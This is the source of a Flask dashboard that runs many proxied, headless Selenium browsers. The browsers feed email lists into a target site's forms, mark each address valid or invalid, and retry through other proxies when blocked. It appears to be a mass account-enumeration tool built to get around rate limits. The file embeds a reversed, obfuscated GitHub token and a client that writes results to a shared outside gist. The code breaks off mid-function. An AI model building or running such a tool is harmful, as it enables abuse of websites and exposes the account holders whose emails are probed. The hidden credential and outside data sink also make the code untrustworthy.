import time
import threading
import queue
import requests
from flask import Flask, render_template, jsonify, request as flask_request, redirect, url_for
from flask_socketio import SocketIO, emit
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from selenium.webdriver.common.keys import Keys
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning
import random
from collections import defaultdict, deque
from datetime import datetime
import database as db
import json
import re
import copy
import tempfile
import shutil
import os
import sys
import subprocess

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ──────────────────────────────────────────────
#  GitHub Gist — shared gist, all dashboards write to the same URL
# ──────────────────────────────────────────────
_GT = "qIKusJZXGYSEMI5KPmbyQH0NNLMdfSIwj9QVy38fltdwdnBabfPIZIdEQbL_fLxLa2fCQ8FH0YUOBJEA11_tap_buhtig"
GIST_PAT     = _GT[::-1]
GIST_ID      = "94bd80e7cd16ee5416c2d5daeb774abd"
GIST_URL     = f"https://gist.github.com/Kira41/{GIST_ID}"
GIST_FILE    = "resultsfinal.txt"

class GistClient:
    def __init__(self):
        self._headers = {
            "Authorization": f"Bearer {GIST_PAT}",
            "Accept": "application/vnd.github+json"
        }

    def get_content(self):
        try:
            resp = requests.get(f"https://api.github.com/gists/{GIST_ID}", headers=self._headers, timeout=15)
            if resp.status_code == 200:
                files = resp.json().get("files", {})
                f = files.get(GIST_FILE, {})
                return f.get("content", "")
            return ""
        except:
            return ""

    def update(self, content):
        try:
            payload = {
                "files": {
                    GIST_FILE: {
                        "content": content
                    }
                }
            }
            resp = requests.patch(f"https://api.github.com/gists/{GIST_ID}", json=payload, headers=self._headers, timeout=15)
            return resp.status_code == 200
        except:
            return False

_gist_client = GistClient()

app = Flask(__name__)
socketio = SocketIO(app)

# ── Runtime State ───────────────────────────────────────────────────
lock = threading.Lock()
email_queue = queue.Queue()
processed_emails = set()
success_count = 0
failure_count = 0
start_time = None
current_emails = []
proxy_stats = {'total': 0, 'active': 0, 'failed': 0, 'retrying': 0}
attempted_proxies = defaultdict(set)
proxy_info = {}
total_emails = 0
turbo_proxies = deque()
turbo_lock = threading.Lock()
log_entries = deque(maxlen=100)
log_lock = threading.Lock()
browser_threads_status = {}
is_running = False
is_finished = False
is_paused = False
is_stopped = False
paste_mode = 'add'
_cleanup_in_progress = False  # True during _stop_cleanup(); blocks new job starts
pause_event = threading.Event()
pause_event.set()  # not paused by default
current_job_id = None
current_domain_id = None
current_domain_name = ''
current_steps = []
step_progress = {}  # {thread_id: {step_idx: 'done'|'running'|'failed', current: idx}}
bg_thread = None
current_domain_ids = []  # for multi-domain mode
current_email_list_id = None  # linked email list for auto-updating results
browser_stats = {}  # {thread_id: {'success':0, 'fail':0, 'tested':0, 'domain':'', 'proxy':'', 'last_email':''}}
browser_domains = {}  # {thread_id: domain_name}
active_drivers = {}  # {thread_id: webdriver instance} — tracks all open browsers for force-kill
active_drivers_lock = threading.Lock()
active_worker_queues = []  # list of all private queues used by workers
active_worker_threads = []  # list of all worker Thread objects
job_generation = 0  # incremented on each stop; workers check this to know if they're stale
email_attempt_counts = defaultdict(int)  # {email_domain_key: count} — tracks total attempts per email across all proxy switches
MAX_EMAIL_ATTEMPTS = 5  # skip email after this many total attempts with no result
skipped_count = 0  # count of emails skipped due to max attempts

# ── ChromeDriver singleton ─────────────────────────────────────────
_chromedriver_path = None
_chromedriver_lock = threading.Lock()
# Debug port pool — each browser gets a unique port, returned on close
_debug_port_pool = set(range(9222, 9322))  # 100 ports available
_debug_port_lock = threading.Lock()

def _allocate_port():
    """Allocate a unique debug port from the pool. Thread-safe."""
    with _debug_port_lock:
        if not _debug_port_pool:
            # Pool exhausted — extend with higher ports
            _debug_port_pool.update(range(9322, 9422))
        return _debug_port_pool.pop()

def _release_port(port):
    """Return a debug port to the pool for reuse. Thread-safe."""
    if port is not None:
        with _debug_port_lock:
            _debug_port_pool.add(port)

def _find_cached_chromedriver():
    """Search for an already-cached chromedriver binary in the .wdm directory.
    Returns the path if found, None otherwise."""
    import glob
    wdm_dir = os.path.join(os.path.expanduser('~'), '.wdm', 'drivers', 'chromedriver')
    if not os.path.isdir(wdm_dir):
        return None
    # Search recursively for chromedriver.exe (Windows) or chromedriver (Linux/Mac)
    patterns = [
        os.path.join(wdm_dir, '**', 'chromedriver.exe'),
        os.path.join(wdm_dir, '**', 'chromedriver'),
    ]
    candidates = []
    for pattern in patterns:
        candidates.extend(glob.glob(pattern, recursive=True))
    if not candidates:
        return None
    # Pick the most recently modified one (likely the latest version)
    candidates.sort(key=lambda p: os.path.getmtime(p), reverse=True)
    # Verify it's actually executable
    best = candidates[0]
    if os.path.isfile(best) and os.access(best, os.X_OK if os.name != 'nt' else os.R_OK):
        return best
    return None

def get_chromedriver_path():
    """Install chromedriver ONCE and cache the path. Thread-safe.
    First checks for a cached binary to avoid network calls that can hang."""
    global _chromedriver_path
    if _chromedriver_path:
        return _chromedriver_path
    with _chromedriver_lock:
        if _chromedriver_path:
            return _chromedriver_path
        # Strategy 1: Use already-cached chromedriver (no network needed)
        cached = _find_cached_chromedriver()
        if cached:
            _chromedriver_path = cached
            add_log(f'🔧 ChromeDriver (cached): {_chromedriver_path}', 'info')
            return _chromedriver_path
        # Strategy 2: Try ChromeDriverManager with a timeout to prevent hanging
        # on network issues. Runs in a thread so we can enforce a deadline.
        result = [None]
        error = [None]
        def _install():
            try:
                result[0] = ChromeDriverManager().install()
            except Exception as e:
                error[0] = e
        t = threading.Thread(target=_install, daemon=True)
        t.start()
        t.join(timeout=30)  # 30s max — if network is down, don't wait forever
        if result[0]:
            _chromedriver_path = result[0]
            add_log(f'🔧 ChromeDriver installed: {_chromedriver_path}', 'info')
            return _chromedriver_path
        # Strategy 3: Last resort — try to find chromedriver on system PATH
        import shutil as _shutil
        system_cd = _shutil.which('chromedriver') or _shutil.which('chromedriver.exe')
        if system_cd:
            _chromedriver_path = system_cd
            add_log(f'🔧 ChromeDriver (system PATH): {_chromedriver_path}', 'info')
            return _chromedriver_path
        # Nothing worked
        err_msg = str(error[0]) if error[0] else 'ChromeDriverManager timed out (network issue?)'
        add_log(f'✗ ChromeDriver not found: {err_msg}', 'bad')
        raise RuntimeError(f'Could not find or install ChromeDriver: {err_msg}')

def kill_all_browsers():
    """Force-quit every tracked browser/WebDriver instance immediately.
    Uses a double-kill strategy: quit tracked drivers, then taskkill for stragglers."""
    with active_drivers_lock:
        for tid, driver in list(active_drivers.items()):
            # Release debug port back to pool
            debug_port = getattr(driver, '_dahaka_debug_port', None)
            chrome_service = getattr(driver, '_dahaka_chrome_service', None)
            try:
                driver.quit()
            except Exception:
                pass
            # Stop the chromedriver process too
            if chrome_service:
                try:
                    chrome_service.stop()
                except Exception:
                    pass
            _release_port(debug_port)
        active_drivers.clear()
    # Safety net: kill any lingering chromedriver processes spawned by automation.
    # NOTE: We intentionally do NOT kill chrome.exe here — that would close the
    # user's own browser (including the dashboard panel). Each automation Chrome
    # is already closed above via driver.quit() + chrome_service.stop().
    # Killing chromedriver.exe is safe — it's exclusively ours.
    try:
        subprocess.run(['taskkill', '/F', '/IM', 'chromedriver.exe'], capture_output=True, timeout=5)
    except Exception:
        pass
    # Double-kill: brief wait then kill again to catch any that respawned
    time.sleep(0.3)
    try:
        subprocess.run(['taskkill', '/F', '/IM', 'chromedriver.exe'], capture_output=True, timeout=5)
    except Exception:
        pass

def drain_all_queues():
    """Drain the shared email_queue and all tracked private queues."""
    # Drain shared queue
    while not email_queue.empty():
        try:
            email_queue.get_nowait()
            email_queue.task_done()
        except Exception:
            break
    # Drain all private queues
    for q in active_worker_queues:
        while not q.empty():
            try:
                q.get_nowait()
                q.task_done()
            except Exception:
                break
    # Send poison pills to unblock any workers stuck on queue.get()
    # For the shared queue, send enough pills for max possible browsers
    for _ in range(50):
        try:
            email_queue.put_nowait(None)
        except Exception:
            break
    for q in active_worker_queues:
        for _ in range(50):
            try:
                q.put_nowait(None)
            except Exception:
                break

def force_stop_old_job():
    """Ensure any previous background job and its workers are fully dead.
    Call this BEFORE starting a new job."""
    global is_stopped, job_generation
    is_stopped = True
    job_generation += 1
    pause_event.set()
    kill_all_browsers()
    drain_all_queues()
    for t in active_worker_threads:
        try:
            t.join(timeout=10)
        except Exception:
            pass
    if bg_thread and bg_thread.is_alive():
        bg_thread.join(timeout=10)
        # If it's STILL alive, it will exit on its own via is_stopped checks
        # but we proceed anyway — the generation counter prevents interference
    active_worker_threads.clear()
    active_worker_queues.clear()

def reset_job_state():
    """Full reset of all runtime state back to zero-point, ready for a new job."""
    global success_count, failure_count, start_time, total_emails, skipped_count
    global is_running, is_finished, is_paused, is_stopped, _cleanup_in_progress
    global current_job_id, current_domain_id, current_domain_name, current_steps
    global bg_thread, current_domain_ids, current_email_list_id
    success_count = 0
    failure_count = 0
    start_time = None
    total_emails = 0
    current_emails.clear()
    proxy_stats.update({'total': 0, 'active': 0, 'failed': 0, 'retrying': 0})
    attempted_proxies.clear()
    proxy_info.clear()
    with turbo_lock:
        turbo_proxies.clear()
    browser_threads_status.clear()
    step_progress.clear()
    browser_stats.clear()
    browser_domains.clear()
    processed_emails.clear()
    email_attempt_counts.clear()
    skipped_count = 0
    is_running = False
    is_finished = False
    is_paused = False
    is_stopped = False
    _cleanup_in_progress = False
    pause_event.set()
    current_job_id = None
    current_domain_id = None
    current_domain_name = ''
    current_steps = []
    current_domain_ids = []
    current_email_list_id = None
    bg_thread = None
    active_worker_queues.clear()
    active_worker_threads.clear()
    # Drain any leftover items in the queue
    while not email_queue.empty():
        try:
            email_queue.get_nowait()
            email_queue.task_done()
        except:
            break

class ProxyError(Exception):
    pass

class CaptchaError(Exception):
    pass

def add_log(message, level='info'):
    with log_lock:
        log_entries.append({'timestamp': datetime.now().strftime('%H:%M:%S'), 'message': message, 'level': level})

_EMAIL_RE = re.compile(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$')

def clean_emails(raw_list):
    """Remove duplicates and invalid emails. Returns cleaned list."""
    seen = set()
    cleaned = []
    duplicates = 0
    invalid = 0
    for email in raw_list:
        if not _EMAIL_RE.match(email):
            invalid += 1
            continue
        lower = email.lower()
        if lower in seen:
            duplicates += 1
            continue
        seen.add(lower)
        cleaned.append(email)
    if duplicates or invalid:
        add_log(f'🧹 Cleaned emails — {duplicates} duplicates, {invalid} invalid removed', 'warn')
    return cleaned

def cfg():
    """Get current config from DB."""
    return db.get_config()

# ── Proxy Management ───────────────────────────────────────────────
def load_proxies(config):
    mode = config.get('proxy_mode', 'local_file')
    if mode == 'no_proxy':
        # No proxy mode — clear any loaded proxies, browsers connect directly
        proxy_info.clear()
        with turbo_lock:
            turbo_proxies.clear()
        proxy_stats.update({'total': 0, 'active': 0, 'failed': 0, 'retrying': 0})
        add_log('🚫 No Proxy mode — browsers will connect directly', 'info')
        return
    if mode == 'rotated_ip':
        # Load rotated IP proxies from DB
        rotated = db.get_rotated_proxies()
        enabled = [r for r in rotated if r.get('enabled', 1)]
        if not enabled:
            add_log('⚠ No enabled rotated proxies configured', 'warn')
            return
        for r in enabled:
            addr = f"{r['ip']}:{r['port']}"
            if addr not in proxy_info:
                proxy_info[addr] = {'state': 'available', 'retries': 0}
            elif proxy_info[addr]['state'] == 'failed':
                # Reset failed proxies so they can be re-validated
                proxy_info[addr]['state'] = 'available'
                proxy_info[addr]['retries'] = 0
        # Remove proxies no longer in DB
        db_addrs = set(f"{r['ip']}:{r['port']}" for r in enabled)
        for p in list(proxy_info.keys()):
            if p not in db_addrs:
                del proxy_info[p]
                with turbo_lock:
                    if p in turbo_proxies:
                        turbo_proxies.remove(p)
        proxy_stats['total'] = len(proxy_info)
        proxy_stats['active'] = sum(1 for p in proxy_info.values() if p['state'] == 'active')
        proxy_stats['failed'] = sum(1 for p in proxy_info.values() if p['state'] == 'failed')
        add_log(f'🔄 Loaded {len(enabled)} rotated IP proxies', 'info')
        return
    # local_file mode
    try:
        with open(config.get('proxy_file', 'google_valid_proxies.txt'), 'r') as f:
            current_proxies = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        add_log('⚠ Proxy file not found', 'warn')
        return
    existing = set(proxy_info.keys())
    for p in current_proxies:
        if p not in existing:
            proxy_info[p] = {'state': 'available', 'retries': 0}
        elif proxy_info[p]['state'] == 'failed':
            proxy_info[p]['state'] = 'available'
            proxy_info[p]['retries'] = 0
    for p in existing - set(current_proxies):
        del proxy_info[p]
        with turbo_lock:
            if p in turbo_proxies:
                turbo_proxies.remove(p)
    proxy_stats['total'] = len(proxy_info)
    proxy_stats['active'] = sum(1 for p in proxy_info.values() if p['state'] == 'active')
    proxy_stats['failed'] = sum(1 for p in proxy_info.values() if p['state'] == 'failed')
    add_log(f'📁 Loaded {len(current_proxies)} proxies from file', 'info')

# ── Proxy Validation ───────────────────────────────────────────────
def validate_proxy(proxy, config):
    """Open google.com through the proxy to check if it works."""
    chrome_options = Options()
    chrome_options.add_argument(f'--proxy-server={proxy}')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--log-level=3')
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--window-size=1920,1080')
    # Use a unique temp profile so parallel validations don't clash
    tmp_profile = tempfile.mkdtemp(prefix='dahaka_val_')
    chrome_options.add_argument(f'--user-data-dir={tmp_profile}')
    driver = None
    try:
        driver_path = get_chromedriver_path()
        driver = webdriver.Chrome(service=ChromeService(driver_path), options=chrome_options)
        driver.set_page_load_timeout(config.get('page_load_timeout', 10))
        driver.get('https://www.google.com')
        # Check page loaded by looking for the body or a known element
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
        # Verify we actually reached google
        if 'google' in driver.current_url.lower() or 'google' in driver.title.lower():
            return True
        return False
    except:
        return False
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass
        try:
            shutil.rmtree(tmp_profile, ignore_errors=True)
        except:
            pass

def _validate_worker(proxy, config, results):
    """Thread worker for proxy validation."""
    with lock:
        if proxy in proxy_info:
            proxy_info[proxy]['state'] = 'checking'
    ok = validate_proxy(proxy, config)
    results[proxy] = ok

def validate_all_proxies(config):
    """Validate all loaded proxies by opening google.com. Marks valid ones as 'active', failed as 'failed'."""
    proxies_to_test = [p for p, info in proxy_info.items() if info['state'] in ('available', 'active')]
    if not proxies_to_test:
        add_log('⚠ No proxies to validate', 'warn')
        return 0

    add_log(f'🔍 Validating {len(proxies_to_test)} proxies via google.com...', 'info')
    socketio.emit('proxy_validation', {'status': 'running', 'total': len(proxies_to_test), 'checked': 0, 'valid': 0})

    results = {}
    threads = []
    # Run validation in parallel (max 10 at a time)
    batch_size = min(10, len(proxies_to_test))
    for i in range(0, len(proxies_to_test), batch_size):
        batch = proxies_to_test[i:i+batch_size]
        batch_threads = []
        for proxy in batch:
            t = threading.Thread(target=_validate_worker, args=(proxy, config, results))
            t.start()
            batch_threads.append(t)
        for t in batch_threads:
            t.join()
        # Update stats after each batch
        valid_so_far = sum(1 for v in results.values() if v)
        socketio.emit('proxy_validation', {'status': 'running', 'total': len(proxies_to_test), 'checked': len(results), 'valid': valid_so_far})

    # Apply results
    valid_count = 0
    with lock:
        for proxy, is_valid in results.items():
            if proxy in proxy_info:
                if is_valid:
                    proxy_info[proxy]['state'] = 'active'
                    proxy_info[proxy]['retries'] = 0
                    valid_count += 1
                    with turbo_lock:
                        if proxy not in turbo_proxies:
                            turbo_proxies.append(proxy)
                else:
                    proxy_info[proxy]['state'] = 'failed'
        proxy_stats['total'] = len(proxy_info)
        proxy_stats['active'] = sum(1 for p in proxy_info.values() if p['state'] == 'active')
        proxy_stats['failed'] = sum(1 for p in proxy_info.values() if p['state'] == 'failed')

    failed_count = len(results) - valid_count
    add_log(f'✅ Validation done — {valid_count} valid, {failed_count} failed', 'good' if valid_count > 0 else 'bad')
    socketio.emit('proxy_validation', {'status': 'done', 'total': len(proxies_to_test), 'checked': len(results), 'valid': valid_count})
    return valid_count

# ── Generic Automation Engine ──────────────────────────────────────
SELECTOR_MAP = {'id': By.ID, 'name': By.NAME, 'css': By.CSS_SELECTOR, 'xpath': By.XPATH, 'tag': By.TAG_NAME}

def _find_interactive_element(driver, by, sel_val, timeout):
    """Wait for element to be visible and clickable, scroll it into view, and return it.
    Uses retry logic to handle stale element references from SPA re-renders."""
    from selenium.common.exceptions import StaleElementReferenceException
    last_err = None
    for attempt in range(3):
        if is_stopped:
            raise ProxyError("Job stopped by user")
        try:
            # Use short poll intervals so we can detect stop quickly
            el = WebDriverWait(driver, timeout, poll_frequency=0.5, ignored_exceptions=[StaleElementReferenceException]).until(
                EC.element_to_be_clickable((by, sel_val))
            )
            if is_stopped:
                raise ProxyError("Job stopped by user")
            # Scroll into viewport so Chrome actually renders and activates the element
            driver.execute_script("arguments[0].scrollIntoView({block:'center',behavior:'instant'});", el)
            time.sleep(0.15)
            return el
        except StaleElementReferenceException as e:
            last_err = e
            time.sleep(0.3)
    raise last_err or TimeoutException(f"Element not interactive: {sel_val}")

def _js_set_value(driver, el, value):
    """Set input value via JavaScript — works even when send_keys is silently ignored."""
    driver.execute_script("""
        var el = arguments[0];
        var val = arguments[1];
        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        nativeInputValueSetter.call(el, val);
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
    """, el, value)

def _js_click(driver, el):
    """Click via JavaScript — works when regular click is intercepted or element is obscured."""
    driver.execute_script("arguments[0].click();", el)

# ── Element Visibility Check ────────────────────────────────────────────
# Works in BOTH headed and headless modes.
# In headless mode, elements may report zero dimensions even when visible,
# so we check CSS properties (display/visibility/opacity) as the primary signal
# and only use dimensions as a secondary hint in headed mode.
_JS_IS_VISIBLE = """
    var el = arguments[0];
    if (!el) return {visible: false, reason: 'null_element'};

    // 1. Check if element is in the DOM
    if (!el.isConnected) return {visible: false, reason: 'not_in_dom'};

    // 2. Walk element + ALL ancestors checking CSS hiding properties
    var node = el;
    var cssHidden = false;
    var cssReason = '';
    while (node && node !== document && node.nodeType === 1) {
        try {
            var s = window.getComputedStyle(node);
            if (s.display === 'none') {
                cssHidden = true;
                cssReason = 'display_none on ' + node.tagName + (node.id ? '#'+node.id : '');
                break;
            }
            if (s.visibility === 'hidden' || s.visibility === 'collapse') {
                cssHidden = true;
                cssReason = 'visibility_hidden on ' + node.tagName + (node.id ? '#'+node.id : '');
                break;
            }
            if (parseFloat(s.opacity) < 0.01) {
                cssHidden = true;
                cssReason = 'opacity_zero on ' + node.tagName + (node.id ? '#'+node.id : '');
                break;
            }
        } catch(e) {}
        node = node.parentElement;
    }

    if (cssHidden) {
        return {visible: false, reason: cssReason};
    }

    // 3. Element passed all CSS checks — it's NOT hidden by CSS.
    //    Get dimensions for logging (may be 0 in headless, that's OK).
    var rect = el.getBoundingClientRect();
    var w = rect.width || el.offsetWidth || 0;
    var h = rect.height || el.offsetHeight || 0;

    // 4. If CSS says visible, trust it — even if dimensions are 0 (headless mode).
    //    The element is in the DOM, not display:none, not visibility:hidden, not opacity:0.
    return {
        visible: true, reason: 'css_visible',
        w: Math.round(w), h: Math.round(h),
        tag: el.tagName, id: el.id || '',
        cls: (el.className || '').toString().substring(0, 60),
        text: (el.innerText || el.textContent || '').substring(0, 40)
    };
"""

def _is_element_visible(driver, element, thread_id=None):
    """Headless-safe visibility check. Uses CSS properties (display, visibility, opacity)
    as the primary signal — NOT dimensions, which can be 0 in headless mode.
    Falls back to Selenium is_displayed() and then a simple DOM presence check.
    Returns (is_visible: bool, detail: dict)."""

    # Strategy 1: JS CSS-based check (works in both headed and headless)
    try:
        result = driver.execute_script(_JS_IS_VISIBLE, element)
        if result and isinstance(result, dict):
            visible = result.get('visible', False)
            if thread_id:
                add_log(f'[{thread_id}]   visibility: visible={visible} reason={result.get("reason")} tag={result.get("tag","")} id={result.get("id","")} w={result.get("w",0)} h={result.get("h",0)} text="{result.get("text","")[:20]}"', 'info')
            return visible, result
    except Exception as js_err:
        if thread_id:
            add_log(f'[{thread_id}]   visibility JS error: {str(js_err)[:60]} — trying fallback', 'warn')

    # Strategy 2: Selenium is_displayed()
    try:
        sel_visible = element.is_displayed()
        if thread_id:
            add_log(f'[{thread_id}]   visibility Selenium fallback: is_displayed()={sel_visible}', 'info')
        if sel_visible:
            return True, {'visible': True, 'reason': 'selenium_is_displayed'}
    except Exception as sel_err:
        if thread_id:
            add_log(f'[{thread_id}]   visibility Selenium error: {str(sel_err)[:50]}', 'warn')

    # Strategy 3: DOM presence + not display:none (headless last resort)
    try:
        check = driver.execute_script("""
            var el = arguments[0];
            if (!el || !el.isConnected) return {inDom: false};
            var s = window.getComputedStyle(el);
            return {
                inDom: true,
                display: s.display,
                visibility: s.visibility,
                tagName: el.tagName
            };
        """, element)
        if check and check.get('inDom') and check.get('display') != 'none' and check.get('visibility') != 'hidden':
            if thread_id:
                add_log(f'[{thread_id}]   visibility DOM fallback: VISIBLE (in DOM, display={check.get("display")}, vis={check.get("visibility")})', 'info')
            return True, {'visible': True, 'reason': 'dom_css_fallback', 'display': check.get('display'), 'tag': check.get('tagName')}
        else:
            if thread_id:
                add_log(f'[{thread_id}]   visibility DOM fallback: NOT visible check={check}', 'info')
    except Exception as dom_err:
        if thread_id:
            add_log(f'[{thread_id}]   visibility DOM error: {str(dom_err)[:50]}', 'warn')

    return False, {'visible': False, 'reason': 'all_checks_failed'}

def execute_automation(driver, steps, email, domain_url, config, thread_id=None):
    """Run automation steps. Returns 'valid', 'invalid', or raises ProxyError.
    Uses robust interaction methods safe for concurrent multi-browser execution."""
    from selenium.common.exceptions import StaleElementReferenceException, ElementClickInterceptedException
    result = None
    sp = {}
    step_delay = config.get('step_delay', 1.0)  # delay between steps (increased for multi-browser stability)
    
    # Debug screenshots for diagnosing multi-browser issues
    _diag_dir = 'c:/Users/Admin/Desktop/dahaka/new/job_screenshots'
    try:
        os.makedirs(_diag_dir, exist_ok=True)
    except:
        pass
    def _screenshot(name):
        try:
            path = os.path.join(_diag_dir, f'{thread_id or "x"}_{name}.png')
            driver.save_screenshot(path)
        except Exception as scr_err:
            print(f'[SCREENSHOT ERROR] {thread_id} {name}: {scr_err}', flush=True)

    for idx, step in enumerate(steps):
        # ABORT immediately if job was stopped
        if is_stopped:
            raise ProxyError("Job stopped by user")

        action = step['action']
        sel_type = step.get('selector_type', '')
        sel_val = step.get('selector_value', '')
        inp_val = step.get('input_value', '').replace('{{EMAIL}}', email).replace('{{DOMAIN_URL}}', domain_url)
        timeout = step.get('timeout', 10)  # 10s default — proxied pages are slow
        on_ok = step.get('on_success', 'continue')
        on_fail = step.get('on_failure', 'proxy_error')
        by = SELECTOR_MAP.get(sel_type, By.ID)
        # Mark step as running
        sp[idx] = 'running'
        if thread_id:
            with lock:
                step_progress[thread_id] = dict(sp)

        if is_stopped:
            raise ProxyError("Job stopped by user")

        # Force JS sync before every action — makes Chrome process pending JavaScript
        try:
            driver.execute_script("return document.body.innerHTML.length")
        except:
            pass

        try:
            if action == 'navigate':
                driver.get(inp_val if inp_val else domain_url)
                # Wait for page to stabilize — use small increments so stop is responsive
                nav_wait = config.get('navigate_wait', 2.5)
                for _ in range(int(nav_wait / 0.3) + 1):
                    if is_stopped:
                        raise ProxyError("Job stopped by user")
                    time.sleep(0.3)

                # Wait for document.readyState == "complete" (page fully loaded)
                page_loaded = False
                if not is_stopped:
                    try:
                        WebDriverWait(driver, timeout).until(
                            lambda d: d.execute_script("return document.readyState") == "complete"
                        )
                        page_loaded = True
                    except:
                        pass

                # If readyState didn't reach "complete", check if it's at least "interactive"
                if not page_loaded and not is_stopped:
                    try:
                        state = driver.execute_script("return document.readyState")
                        if state in ("interactive", "complete"):
                            page_loaded = True
                    except:
                        pass

                if is_stopped:
                    raise ProxyError("Job stopped by user")

                # ── ONLY check for actual proxy/network error pages ──────
                # Navigation is VALID as long as a real page loaded (readyState complete).
                # Only reject if Chrome is showing an error page (ERR_CONNECTION_RESET etc.)
                if not is_stopped:
                    try:
                        error_check = driver.execute_script("""
                            var pageText = (document.title + ' ' + (document.body ? document.body.innerText : '')).toLowerCase();
                            var errorPatterns = [
                                'err_connection_reset', 'err_proxy_connection_failed',
                                'err_tunnel_connection_failed', 'err_connection_refused',
                                'err_connection_timed_out', 'err_name_not_resolved',
                                'err_internet_disconnected', 'err_proxy_auth_unsupported',
                                'err_socks_connection_failed', 'err_timed_out',
                                'this site can\\'t be reached', 'unable to connect'
                            ];
                            for (var i = 0; i < errorPatterns.length; i++) {
                                if (pageText.indexOf(errorPatterns[i]) !== -1) {
                                    return {error: true, pattern: errorPatterns[i], title: document.title.substring(0, 50)};
                                }
                            }
                            return {
                                error: false,
                                url: window.location.href.substring(0, 80),
                                bodyLen: document.body ? document.body.innerHTML.length : 0,
                                readyState: document.readyState
                            };
                        """)
                        if error_check and error_check.get('error'):
                            add_log(f'[{thread_id}] Navigate FAILED: proxy error page detected — {error_check.get("pattern")}', 'bad')
                            _screenshot(f'nav_error_step{idx}')
                            raise ProxyError(f"Proxy error page: {error_check.get('pattern')}")
                        else:
                            body_len = error_check.get('bodyLen', 0) if error_check else 0
                            actual_url = error_check.get('url', '') if error_check else ''
                            add_log(f'[{thread_id}] Navigate OK: url={actual_url[:60]} body={body_len} readyState={error_check.get("readyState","")}', 'info')
                    except ProxyError:
                        raise
                    except Exception as nav_err:
                        # JS execution failed — page may still be loading or browser crashed
                        if not page_loaded:
                            add_log(f'[{thread_id}] Navigate FAILED: page not loaded and JS error: {str(nav_err)[:60]}', 'bad')
                            raise ProxyError(f"Navigation failed: {str(nav_err)[:60]}")
                        else:
                            # Page loaded (readyState=complete) but JS check failed — still valid
                            add_log(f'[{thread_id}] Navigate OK (readyState=complete, error check skipped: {str(nav_err)[:40]})', 'info')

            elif action == 'check_url':
                if inp_val and inp_val.lower() not in driver.current_url.lower():
                    raise Exception(f"URL doesn't contain '{inp_val}'")

            elif action in ('type', 'fill'):
                el = _find_interactive_element(driver, by, sel_val, timeout)
                # --- JAVASCRIPT-ONLY APPROACH (PARALLEL-SAFE) ---
                # MUST NOT use send_keys() — it requires OS keyboard focus which only
                # the topmost window has. When multiple Chrome windows run simultaneously,
                # send_keys() steals focus and types into the WRONG browser.
                # JavaScript executes inside each browser's own JS engine — no focus needed.
                driver.execute_script("""
                    var el = arguments[0];
                    var val = arguments[1];
                    // Focus the element
                    el.focus();
                    el.click();
                    // Clear existing value
                    el.value = '';
                    // Use native setter to bypass React/Vue controlled component guards
                    var nativeSetter = Object.getOwnPropertyDescriptor(
                        window.HTMLInputElement.prototype, 'value'
                    ).set;
                    nativeSetter.call(el, val);
                    // Dispatch all events that frameworks listen for
                    el.dispatchEvent(new Event('focus', {bubbles: true}));
                    el.dispatchEvent(new Event('input', {bubbles: true}));
                    el.dispatchEvent(new Event('change', {bubbles: true}));
                    el.dispatchEvent(new KeyboardEvent('keydown', {bubbles: true}));
                    el.dispatchEvent(new KeyboardEvent('keyup', {bubbles: true}));
                """, el, inp_val)
                time.sleep(0.3)
                # Verify the value was actually set
                actual_val = driver.execute_script("return arguments[0].value", el) or ''
                if inp_val and inp_val not in actual_val:
                    # JS native setter didn't work — try alternative JS approaches
                    add_log(f'[{thread_id}] JS type attempt 1 failed for "{sel_val[:20]}": got "{actual_val[:20]}" — trying alternative JS', 'warn')
                    # Alternative: use direct property assignment + manual event dispatch
                    driver.execute_script("""
                        var el = arguments[0];
                        var val = arguments[1];
                        el.setAttribute('value', val);
                        el.value = val;
                        // React 16+ synthetic event system
                        var tracker = el._valueTracker;
                        if (tracker) { tracker.setValue(''); }
                        el.dispatchEvent(new Event('input', {bubbles: true}));
                        el.dispatchEvent(new Event('change', {bubbles: true}));
                    """, el, inp_val)
                    time.sleep(0.3)
                    actual_val = driver.execute_script("return arguments[0].value", el) or ''
                    if inp_val and inp_val not in actual_val:
                        raise Exception(f"Type failed (JS-only): value is '{actual_val[:30]}' expected '{inp_val[:30]}'")
                if thread_id:
                    add_log(f'[{thread_id}] Typed "{inp_val[:25]}" into {sel_type}:{sel_val[:25]} OK', 'info')

            elif action == 'click':
                el = _find_interactive_element(driver, by, sel_val, timeout)
                # --- JAVASCRIPT-ONLY CLICK (PARALLEL-SAFE) ---
                # MUST NOT use ActionChains or native el.click() — they require OS mouse
                # focus which fails when multiple Chrome windows overlap each other.
                # JavaScript click dispatches events inside the browser's JS engine directly.

                # Strategy 1: Full mouse event sequence via JS (works with React/Vue/Angular)
                driver.execute_script("""
                    var el = arguments[0];
                    el.scrollIntoView({block: 'center'});
                    // Dispatch full mouse event sequence — React listens to these
                    ['mousedown', 'mouseup', 'click'].forEach(function(eventType) {
                        var event = new MouseEvent(eventType, {
                            bubbles: true, cancelable: true, view: window,
                            button: 0, buttons: 1
                        });
                        el.dispatchEvent(event);
                    });
                """, el)
                time.sleep(1.0)
                # Strategy 2: If JS mouse events didn't trigger, try direct .click() via JS
                # This is different from Selenium's el.click() — it runs inside the JS engine
                try:
                    url_before = driver.current_url
                    body_before = driver.execute_script("return document.body.innerText.length") or 0
                    time.sleep(0.3)
                    url_after = driver.current_url
                    body_after = driver.execute_script("return document.body.innerText.length") or 0
                    if url_after == url_before and abs(body_after - body_before) < 100:
                        driver.execute_script("arguments[0].click();", el)
                        time.sleep(0.5)
                        # Strategy 3: If element is inside a form, submit the form directly
